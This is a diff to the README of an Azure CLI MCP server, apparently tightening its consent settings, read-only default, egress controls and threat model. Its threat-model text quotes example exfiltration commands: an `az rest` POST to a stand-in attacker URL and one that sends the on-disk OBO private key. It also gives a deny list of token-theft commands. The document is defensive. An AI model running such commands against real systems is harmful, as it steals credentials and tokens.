@@ -67,7 +67,9 @@ exchange + cert load happen per call, in an isolated `AZURE_CONFIG_DIR`.
 
 1. Entra → **App registrations → New**. Single tenant.
 2. **Expose an API** → accept the default **Application ID URI** `api://<client-id>` →
-   **Add a scope** `user_impersonation` (who can consent: Admins and users).
+   **Add a scope** `user_impersonation`. For prod, set **who can consent: Admins only** and
+   require app assignment, so a random client app can't obtain a callable token; pair with
+   `AZOBO_ALLOWED_CLIENTS` / `AZOBO_REQUIRED_SCOPE` server-side (see Security).
 3. **Certificates & secrets → Certificates → Upload** the public cert (step 2 below).
 4. **API permissions** → add the **delegated** downstream permissions you want reachable
    (each is a *resource* the OBO can mint a token for), then **Grant admin consent**.
@@ -180,13 +182,30 @@ This server runs the full Azure CLI as the signed-in user; treat it accordingly.
   `IPAddressDeny=169.254.0.0/16 fe80::/10` stops `az rest`/SSRF from reaching IMDS to lift
   the *host's* managed-identity token. Public Azure endpoints are unaffected; uncomment the
   RFC1918 ranges to also fence internal networks.
-- **Optional `AZOBO_READONLY`** forces Graph GET-only and refuses mutating `az` verbs —
-  including `rest`/`invoke` with a non-GET method. This is **defense-in-depth, not a policy
-  boundary**: it's a best-effort blocklist, not a command allowlist. For a *real* read-only
-  deployment, assign users only **Reader** RBAC roles and consent the app to read-only
-  scopes — RBAC is the authoritative boundary.
+- **Caller authorization.** Validate more than aud/iss/exp in a multi-client tenant:
+  `AZOBO_REQUIRED_SCOPE` (the token's `scp` must contain it, e.g. `user_impersonation`) and
+  `AZOBO_ALLOWED_CLIENTS` (allow-list of calling app IDs via `azp`/`appid`). Prefer
+  **admin-only consent / app assignment** on the resource app so a random client can't
+  obtain a callable token in the first place.
+- **Read-only by default.** The example env ships `AZOBO_READONLY=true` (Graph GET-only;
+  refuses mutating `az` verbs incl. `rest`/`invoke` non-GET) — the dangerous default is the
+  safe one. Set it `false` to allow writes (then per-user RBAC is the boundary). Note this is
+  **defense-in-depth, not a hard boundary** — a best-effort blocklist, not a command
+  allowlist. For a *real* read-only deployment, assign users only **Reader** RBAC + read-only
+  consent; RBAC is authoritative.
+- **Egress / exfil control.** The unit blocks IMDS/link-local
+  (`IPAddressDeny=169.254.0.0/16 fe80::/10`) so `az rest`/SSRF can't lift the *host's*
+  managed-identity token. **That does not stop exfil to public endpoints** (`az rest --method
+  POST --url https://attacker …`). For less-trusted callers either set
+  `AZOBO_DENY_COMMANDS=rest,account get-access-token` (removes the rawest token/SSRF
+  primitives) and/or force outbound traffic through a **proxy/firewall allow-list of Azure
+  endpoints only**. ⚠️ `IPAddressDeny` needs cgroup/BPF — on some container hosts it silently
+  no-ops; verify with `systemctl show azobo-mcp -p IPAddressDeny`.
 - The wrapped CLI runs with `AZURE_CORE_DISABLE_DYNAMIC_INSTALL=yes` (no extension code
   auto-runs) and a **minimal environment** (only the vars the wrapper needs).
+- **Disk:** `LimitFSIZE` caps a *single* file; a batch of many sub-limit files can still fill
+  the writable paths. For untrusted use, mount `/var/lib/azobo` (and `/tmp`) as size-limited
+  tmpfs / with a disk quota, or don't expose persistent writable paths to the child at all.
 
 ### Threat model & the one residual you must accept (or design out)
 
@@ -196,16 +215,28 @@ the boundary working. It is built for **trusted operators**, not anonymous inter
 
 The genuine residual: the OBO broker certificate sits on disk readable by the same `azobo`
 user that runs arbitrary `az`, so a malicious caller could `az rest --body @/etc/azobo/obo.key`
-and exfiltrate it. The sandbox stops host takeover but **cannot** hide the key from `az`,
-because the OBO exchange happens *inside* the `az` subprocess (the wrapper reads the key).
+and exfiltrate it (and the user assertion is likewise handed to the CLI subprocess via env).
+The sandbox stops host takeover but **cannot** hide the key from `az`, because the OBO
+exchange happens *inside* the `az` subprocess (the wrapper reads the key).
+
+**Why the cert matters more than "the user can already act as themselves":** the cert is
+**shared across all users**. Stealing it lets an attacker run the OBO exchange offline —
+outside your sandbox, audit log, and IMDS fence — for *any* user whose assertion they can
+obtain. That is a broader and more durable capability than a single authenticated session.
 
 The real fix is to **not keep a cert on disk at all**. On Azure, deploy with a **federated
 Managed Identity** (the recommended default): the OBO confidential client authenticates via
 the platform, no key file exists, and there is nothing for `az rest` to read. The next step
 beyond that is a **separate credential-broker process** that mints OBO tokens over a local
-socket so the CLI subprocess never holds broker material — planned, not yet built. Until one
-of those lands, treat the cert as a crown jewel and keep this on a trusted, operator-only
-endpoint.
+socket so the CLI subprocess never holds broker material *or the user assertion* — planned,
+not yet built.
+
+**Pick your deployment posture explicitly:**
+- *Federated Managed Identity (no key file):* residual essentially gone — ready.
+- *Cert on disk + fully trusted operators only:* acceptable with eyes open — ready, with that
+  constraint written down and `AZOBO_READONLY=true` unless you deliberately need writes.
+- *Cert on disk + anything less than fully trusted callers:* **not ready** — close `az rest`
+  (`AZOBO_DENY_COMMANDS`) + egress-allow-list first, or move to Managed Identity.
 
 ## License
 
